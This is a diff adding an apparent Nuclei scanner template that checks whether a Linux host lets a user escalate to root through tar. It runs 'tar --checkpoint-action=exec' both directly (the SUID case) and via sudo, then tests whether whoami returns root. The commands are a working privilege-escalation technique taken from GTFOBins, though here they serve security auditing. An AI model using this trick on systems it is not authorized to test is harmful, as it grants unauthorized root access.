@@ -1,0 +1,49 @@
+id: privesc-tar
+
+info:
+  name: tar - Privilege Escalation
+  author: daffainfo
+  severity: high
+  description: |
+    tar is a command-line utility used to create and manipulate archive files. It is commonly used for bundling multiple files and directories into a single archive, often used in conjunction with compression tools like gzip or bzip2. 
+  reference:
+    - https://gtfobins.github.io/gtfobins/tar/
+  metadata:
+    verified: true
+  tags: code,linux,tar,privesc
+
+self-contained: true
+code:
+  - engine:
+      - sh
+      - bash
+    source: |
+      whoami
+
+  #SUID
+  - engine:
+      - sh
+      - bash
+    source: |
+      tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=whoami
+
+  #SUDO
+  - engine:
+      - sh
+      - bash
+    source: |
+      sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=whoami
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: code_1_response
+        words:
+          - "root"
+        negative: true
+
+      - type: dsl
+        dsl:
+          - 'contains(code_2_response, "root")'
+          - 'contains(code_3_response, "root")'
+        condition: or
